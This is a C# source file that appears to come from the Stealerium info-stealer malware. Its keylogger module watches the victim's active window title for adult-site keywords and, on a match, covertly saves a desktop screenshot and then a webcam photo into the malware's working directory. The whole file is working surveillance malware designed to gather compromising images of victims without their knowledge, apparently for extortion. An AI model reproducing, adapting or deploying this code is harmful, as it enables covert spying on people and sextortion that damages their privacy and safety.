using System;
using System.IO;
using System.Linq;
using System.Threading;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Modules.Keylogger
{
    /// <summary>
    /// Detects NSFW activity and captures desktop and webcam screenshots if NSFW content is detected.
    /// </summary>
    internal sealed class PornDetection
    {
        // Directory where NSFW detection logs will be stored, based on the current date.
        private static readonly string LogDirectory = Path.Combine(
            Paths.InitWorkDir(),
            "logs", "nsfw", DateTime.Now.ToString("yyyy-MM-dd")
        );

        /// <summary>
        /// Main action to detect NSFW activity and trigger screenshot capture if detected.
        /// </summary>
        public static void Action()
        {
            if (DetectNSFWContent())
            {
                SaveScreenshots();
            }
        }

        /// <summary>
        /// Detects target NSFW keywords in the active window title.
        /// </summary>
        /// <returns>True if any NSFW content is detected, false otherwise.</returns>
        private static bool DetectNSFWContent()
        {
            try
            {
                // Get the active window title in lowercase
                var activeWindow = WindowManager.ActiveWindow.ToLower();

                // Check if any of the keywords related to NSFW content are found in the active window title
                return Config.PornServices.Any(keyword => activeWindow.Contains(keyword.ToLower()));
            }
            catch (Exception ex)
            {
                // Log any error encountered during the detection process
                Logging.Log($"PornDetection: Error during NSFW detection: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Captures desktop and webcam screenshots when NSFW content is detected.
        /// </summary>
        private static void SaveScreenshots()
        {
            try
            {
                // Create a directory for storing screenshots, named by the current time
                var timestampedLogDir = Path.Combine(LogDirectory, DateTime.Now.ToString("HH.mm.ss"));

                // Ensure the directory exists
                if (!Directory.Exists(timestampedLogDir))
                {
                    Directory.CreateDirectory(timestampedLogDir);
                }

                // Wait 3 seconds before capturing the desktop screenshot
                Thread.Sleep(3000);
                DesktopScreenshot.Make(timestampedLogDir);

                // Wait another 12 seconds before capturing the webcam screenshot
                Thread.Sleep(12000);

                // Only capture the webcam screenshot if NSFW content is still detected
                if (DetectNSFWContent())
                {
                    WebcamScreenshot.Make(timestampedLogDir);
                }
            }
            catch (Exception ex)
            {
                // Log any errors encountered while saving screenshots
                Logging.Log($"PornDetection: Error saving screenshots: {ex.Message}");
            }
        }
    }
}
